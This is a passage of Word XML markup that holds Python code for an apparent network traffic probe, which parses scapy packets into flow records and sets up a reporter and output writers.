        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return names</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="212102D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="556E2DDA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EBA1037">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def to_record(pkt) -&gt; PacketRecord | None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E84D48F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """把 scapy 包转成 PacketRecord。不认识的协议返回 None（不参与建模）。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F344DF6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from scapy.layers.inet import IP, TCP, UDP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673F440E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B11A670">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if IP not in pkt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71AE4CC0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25C02A0E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ip = pkt[IP]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B8BA45D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ip_hdr = int(ip.ihl or 5) * 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="297029FD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    total_len = int(ip.len) if ip.len else len(bytes(ip))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F55E3D5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76136E8E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if TCP in pkt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="447F07D4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        tcp = pkt[TCP]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B0F1D44">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        tcp_hdr = int(tcp.dataofs or 5) * 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A1775ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return PacketRecord(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BE5BB52">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ts=float(pkt.time),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE231BC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            src_ip=ip.src, src_port=int(tcp.sport),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB40BEC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            dst_ip=ip.dst, dst_port=int(tcp.dport),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F952BC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            proto=6,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2D6F11">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            length=total_len,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090322D0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            header_len=ip_hdr + tcp_hdr,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549BC793">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            payload_len=max(total_len - ip_hdr - tcp_hdr, 0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3493BF97">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            tcp_flags=int(tcp.flags),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B0F433E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            tcp_window=int(tcp.window),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="162DE7AA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            tcp_header_len=tcp_hdr,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12BDE926">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D4A387">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if UDP in pkt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34CFC0EF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        udp = pkt[UDP]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D291EC6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return PacketRecord(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13412CF4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ts=float(pkt.time),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D2B3B41">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            src_ip=ip.src, src_port=int(udp.sport),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="747C490A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            dst_ip=ip.dst, dst_port=int(udp.dport),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67ED20C3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            proto=17,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="113020D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            length=total_len,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07C34477">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            header_len=ip_hdr + 8,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26CDF3D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            payload_len=max(total_len - ip_hdr - 8, 0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62FACBE7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="183FCD51">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49BF1B4A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F09E7AE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A21246A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>class Probe:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD95E8A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __init__(self, args, feature_names):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793FEBCB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.args = args</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64A46FB4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.feature_names = feature_names</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08BCBB65">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.table = FlowTable(max_flows=args.max_flows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76AED2DB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.reporter = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F45EAFE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if not args.dry_run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D01D29C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.reporter = Reporter(args.center, args.token, args.probe_id)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72918C62">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.running = threading.Event()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="371EBF92">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.running.set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FABABFB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.packets = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="569089BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.flows_sent = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74312702">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.alerts = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7530CAFA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self._pcap_writer = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F1C04CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self._csv = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F2CB1B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self._csv_writer = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC61C32">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
